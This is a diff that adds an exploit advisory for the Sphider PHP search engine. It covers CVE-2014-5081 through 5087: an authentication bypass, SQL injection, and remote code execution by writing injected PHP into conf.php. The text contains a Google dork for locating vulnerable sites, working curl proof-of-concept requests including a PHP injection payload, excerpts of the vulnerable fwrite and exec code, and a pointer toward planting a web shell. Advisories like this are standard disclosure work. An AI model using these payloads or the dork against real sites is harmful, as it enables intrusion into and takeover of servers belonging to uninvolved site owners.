@@ -1,0 +1,82 @@
+# Exploit Title: Sphider Search Engine - Multiple Vulnerabilities
+# Google Dork: ext:php intext:sphider inurl:search.php
+# Date: 6/20/2014
+# Exploit Author: Shayan Sadigh (twitter.com/r1pplex) | <ienjoy.ripples@gmail.com>
+# Vendor Homepage: http://www.sphider.eu/
+# Version: Sphider < 1.3.6 | Sphider Pro/Plus as well
+# Tested on: Linux & Windows
+# CVE : CVE-2014-5081, CVE-2014-5082, CVE-2014-5083, CVE-2014-5084, CVE-2014-5085, CVE-2014-5086, CVE-2014-5087
+
+1. (patched April 2013), in all versions before 1.3.6 for sphider, 3.2 for sphider-pro, and 3.2 for sphider-plus,
+existed an auth bypass in auth.php, the fix for this was adding an exit();. before that anyone could simply send credentials
+that would not be validated and still login
+
+PoC: curl -d "user=foo&pass=bar" "localhost/sphider/admin/admin.php"
+(or auth.php)
+
+CVE-2014-5081.
+-------------------------------------------------------------------------------------------------------------------------------------
+
+2. SQLi injection (exists in sphider/pro/plus [every version], not patched)..
+A quick glance at the admin.php file shows that this software does not make many attempts to sanatize inputs, and thus leading to issues..
+the following file is from sphider-1.3.6 | http://pastebin.com/raw.php?i=7NJQznmA
+from: http://www.sphider.eu/sphider-1.3.6.zip
+
+PoC: localhost:~$ curl -d "user=foo&pass=bar&f=20&site_id=1'" "http://localhost/sphider/admin/admin.php" | grep "MySQL"
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+
+?f=20&site_id=SQLi
+?f=index&adv=1&url=SQLi
+
+and more..
+
+CVE-2014-5082.
+-------------------------------------------------------------------------------------------------------------------------------------
+
+3. Remote Code Execution (the most severe..)
+An RCE exists in every version of sphider/pro/plus and has not been patched, this is not as severe as before due to the fact that
+you need authentication but combined with the previous auth bypass in older versions it can be quite dangerous. Not to mention
+the possible chance of people keeping the default (admin:admin) login credentials. There is basically 107 instances of this "RCE",
+it is due to sphider using fwrite to write / save the crawler's settings, the issue however is that there is complete lack of
+sanatization...which means an attacker can simply feed sphider malicious PHP and it will be written into the conf.php
+(localhost/sphider/settings/conf.php). In sphider plus/pro there is even more instances of fwrite in the configset.php
+due to the more config options avaliable.
+
+Example (from sphider-1.3.6):
+
+fwrite($fhandle,"\n\n\n/*********************** \nWeights\n***********************/");
+		fwrite($fhandle, "\n\n// Relative weight of a word in the title of a webpage\n");
+		fwrite($fhandle,"$"."title_weight  = ".$_title_weight. ";");
+		fwrite($fhandle, "\n\n// Relative weight of a word in the domain name\n");
+		fwrite($fhandle,"$"."domain_weight = ".$_domain_weight. ";");
+		fwrite($fhandle, "\n\n// Relative weight of a word in the path name\n");
+		fwrite($fhandle,"$"."path_weight	= ".$_path_weight. ";");
+		fwrite($fhandle, "\n\n// Relative weight of a word in meta_keywords\n");
+		fwrite($fhandle,"$"."meta_weight	= ".$_meta_weight. ";");
+
+
+		fwrite($fhandle,"?>");
+		fclose($fhandle);
+
+	}
+
+as you can see the complete lack of santization here allows one to simply feed one of these fields arbitrary php and it will be written to conf.php; this code is reused in all sphider forks/clones
+
+PoC: localhost:~$ curl -d "user=foo&pass=bar&f=settings&Submit=ion_nr=1.3.5&_language=en&_template=standard&_admin_email=admin%40localhost&_tmp_dir=tmp&_log_dir=log&_log_format=html&_min_words_per_page=10&_min_word_length=3&_word_upper_bound=100&_pdftotext_path=&_catdoc_path=&_xls2csv_path=&_catppt_path=&_user_agent=&_min_delay=0&_results_per_page=10&_cat_columns=2&_bound_search_result=0&_length_of_link_desc=0&_links_to_next=9&_desc_length=250&_suggest_rows=0&_title_weight=20&_domain_weight=60&_path_weight=10&_meta_weight=5;echo phpversion();" "http://localhost/sphider/admin/admin.php" | grep "5.3"
+
+5.3.3<div id='submenu'>&nbsp;</div>
+
+Obviously it can be taken a step further and one may inject a php-webshell into conf.php and further escalate..
+
+There is another POSSIBLE RCE, (yes by code) however I have not been able to test it..this rce requires the file converter(s) to be installed, once they are...
+
+admin/spiderfuncs.php:		$a = exec($command,$result, $retval);
+admin/spiderfuncs.php:		$a = exec($command,$result, $retval);
+admin/spiderfuncs.php:		$a = exec($command,$result, $retval);
+admin/spiderfuncs.php:		$a = exec($command,$result, $retval);
+
+once again the lack of sanatization allows possible remote code execution.
+
+CVE-2014-5083, CVE-2014-5084, CVE-2014-5085, CVE-2014-5086, CVE-2014-5087
+----------------------------------------------------------------------------------------------------------------------------------------------
